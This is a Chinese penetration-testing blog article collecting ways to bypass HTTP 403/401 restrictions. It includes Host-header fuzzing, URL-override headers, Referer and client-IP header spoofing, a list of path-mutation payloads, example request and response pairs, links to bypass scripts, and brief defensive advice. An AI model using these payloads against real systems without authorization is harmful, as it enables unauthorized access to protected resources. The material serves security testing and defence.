---
title: 渗透测试中403/401页面绕过的思路总结
url: https://mp.weixin.qq.com/s/8zIA4H-A6hXuwd0LCyCuTA
source: Doonsec's feed
date: 2026-11-06
fetch_date: 2026-11-07T07:55:35.971226
---

# 渗透测试中403/401页面绕过的思路总结

# 渗透测试中403/401页面绕过的思路总结

原创

炫彩之星
炫彩之星

菜鸟学安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

## 0x01 前言

做渗透的时候经常碰到这种情况：资产测绘辛辛苦苦跑完一圈，扫出来的资产点开全是清一色的 403 Forbidden——明知道目录后面藏着东西，门却焊死了。资产多的时候还能挑软柿子捏，最难受的是手里就一个主域、旁站又少得可怜，一排 403 等于开局即终点。

其实大部分 403 并不是"真的没权限"，而是服务端在路径、来源 IP、Host、Referer 这几个维度上做的访问控制判断——判断依据就写在每个请求里，自然就有被改装的空间。

这篇把实战里常用的绕过姿势整理成一份清单：端口、Host 头、X-Original-URL、Referer、伪造 IP、扩展名变形、目录扫描，外加一波 403/401 bypass 的 tips 和脚本资源。以后再撞上 403，照着挨个试一遍，比盯着报错页干瞪眼强得多；面试被问到"403 怎么绕"，这篇也正好当答案。

![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gqUkzmkTEpy9sToCYyVW7w0grGVBhgy6z3wZibGz4UFPwcvLXpw0zHBoC31mK4fhUmZH93Tk8dh237t0RjTiaWbrUsdqSDaw8PzU/640?wx_fmt=png&from=appmsg)

## 0x02 利用姿势

### 1.端口利用

扫描主机端口，找其它开放web服务的端口，访问其端口，挑软柿子。

### 2.修改HOST

Host在请求头中的作用：在一般情况下，几个网站可能会部署在同一个服务器上，或者几个web系统共享一个服务器，通过host头来指定应该由哪个网站或者web系统来处理用户的请求。而很多WEB应用通过获取HTTP HOST头来获得当前请求访问的位置，但是很多开发人员并未意识到HTTP HOST头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。

修改客户端请求头中的Host可以通过修改Host值修改为子域名或者ip来绕过来进行绕过二级域名；首先对该目标域名进行子域名收集，整理好子域名资产（host字段同样支持IP地址）。先Fuzz测试跑一遍收集到的子域名，这里使用的是Burp的Intruder功能。若看到一个服务端返回200的状态码，即表面成功找到一个在HOST白名单中的子域名。我们利用firefox插件来修改HOST值，成功绕过访问限制。

### 3.覆盖请求URL

尝试使用X-Original-URL和X-Rewrite-URL标头绕过Web服务器的限制。通过支持X-Original-URL和X-Rewrite-URL标头，用户可以使用这俩请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制

```
Request
GET /auth/login HTTP/1.1
Response
HTTP/1.1 403 Forbidden
```

```
Reqeust
GET / HTTP/1.1
X-Original-URL: /auth/login
Response
HTTP/1.1 200 OK
```

```
或者：
Reqeust
GET / HTTP/1.1
X-Rewrite-URL: /auth/login
Response
HTTP/1.1 200 OK
```

## 4.Referer标头绕过

尝试使用Referer标头绕过Web服务器的限制。
介绍：Referer请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用Referer请求头识别访问来源。

```
Request
GET /auth/login HTTP/1.1
Host: xxx
Response
HTTP/1.1 403 Forbidden
```

```
Reqeust
GET / HTTP/1.1
Host: xxx
ReFerer:https://xxx/auth/login
Response
HTTP/1.1 200 OK
```

```
或者
Reqeust
GET /auth/login HTTP/1.1
Host: xxx
ReFerer:https://xxx/auth/login
Response
HTTP/1.1 200 OK
```

## 5.代理IP

一般开发者会通过Nginx代理识别访问端IP限制对接口的访问，尝试使用X-Forwarded-For、X-Forwared-Host等标头绕过Web服务器的限制。

```
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwared-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```

如：

```
Request
GET /auth/login HTTP/1.1
Response
HTTP/1.1 401 Unauthorized
```

```
Reqeust
GET /auth/login HTTP/1.1
X-Custom-IP-Authorization: 127.0.0.1
Response
HTTP/1.1 200 OK
```

## 6.扩展名绕过

基于扩展名，用于绕过403受限制的目录。

```
site.com/admin => 403
site.com/admin/ => 200
site.com/admin// => 200
site.com//admin// => 200
site.com/admin/* => 200
site.com/admin/*/ => 200
site.com/admin/. => 200
site.com/admin/./ => 200
site.com/./admin/./ => 200
site.com/admin/./. => 200
site.com/admin/./. => 200
site.com/admin? => 200
site.com/admin?? => 200
site.com/admin??? => 200
site.com/admin…;/ => 200
site.com/admin/…;/ => 200
site.com/%2f/admin => 200
site.com/%2e/admin => 200
site.com/admin%20/ => 200
site.com/admin%09/ => 200
site.com/%20admin%20/ => 200
```

## 7.扫描的时候

遇到403了，上目录扫描工具，扫目录，扫文件（记住，扫描的时候要打开探测403，因为有些网站的目录没有权限访问会显示403，但是在这个目录下面的文件，我们或许能扫描到并访问）

## 8.最后补充再一些401和403 bypass的tips

![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1grERgIQkVcxKWicsqPXEnvUVWTt2hyaIAqNCOzCFhgzIhHGZzv8MtURsIlTjqHS8ahg5T0YBYevicQP1gntwxmw45ZbRoJRXpPB4/640?wx_fmt=png&from=appmsg)

![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gp4Xy9n8QP6icPlYtcD1AITactyNIM4OWswo904ROFDKHbFpgvD2vPNY229TuHMicwDrChYwCGnn0dpQkfDTCQZSTbq9VPhAibia8Q/640?wx_fmt=png&from=appmsg)

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1grZWbpELMfN4eeZyYmCLE9hicYjgyubhHTNFyyk735p9EkT7VZzuapm4UiaIUZicMQHgtKichR7ic55UuN8gqIQ5SmLYm17z4BbEGhU/640?wx_fmt=png&from=appmsg)

![在这里插入图片描述](https://mmbiz.qpic.cn/sz_mmbiz_png/oFamj4ye1gqXFKlXgicyZuic1ia0B5Uht0kPfSK6icoKN7eH32I192rhLKCs3iaQib1aAIzkjsIEibuNr0xbl3dTAHPxD8FErP1692aicpg2jhtiaAJE/640?wx_fmt=png&from=appmsg)

Github上一些bypass 403的脚本

```
https://github.com/sting8k/BurpSuite_403Bypasser
https://github.com/yunemse48/403bypasser
https://github.com/devploit/dontgo403
https://github.com/daffainfo/bypass-403
```

```
以及403bypass的wiki
https://kathan19.gitbook.io/howtohunt/status-code-bypass/403bypass
```

![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/oFamj4ye1gqKiapzQkVygbYyK3Zrq95gficrFtmRFdnHnFRprZhzoceQ2MREqKEuuDzCS9g2xwgr07gcJzKJyFh4IGzQqICRibsCDJ8LPBDJYo/640?wx_fmt=png&from=appmsg)

## 0x03 写在最后

回头看这几类姿势，其实就一句话：403/401 的本质是服务端拿"请求长得像不像合法用户"来做判断，所以绕过思路全是围绕"把请求改装成它期望的样子"——路径上用 ./ 、…; 、%2e、%20 这些变形骗过匹配，请求头里改 Host、Referer、X-Original-URL 伪装来源，XFF 一口气伪造内网 IP，路径和头都不灵就换端口找更松的服务，最后目录扫描兜底收尾。

下次撞到 403，建议按"改路径 → 改头 → 伪造 IP → 换端口 → 上扫描"的顺序过一遍，成本从低到高，多数站点在前几步就松口了。文中的 tips 图和 GitHub 脚本、wiki 链接都在上面第 8 节，直接取用就行。

反过来说，防守侧想挡住这些姿势，方向也很明确：鉴权只认会话和权限，别拿 Host、Referer、XFF 这类客户端可伪造的头做判断依据；网关层对路径做归一化，畸形路径（./、;、%2e、%20、多重斜杠）直接拒绝；403 页面少回显细节，别给攻击者喂探测信号。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/HezRQjNneVHy39103FjCvxFaZicO2OgEB05ZbBLwibDiaCTqDJNUHUCC9OXjVeiasG4ibOVR0dg284RCzVquVhvQ3xQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过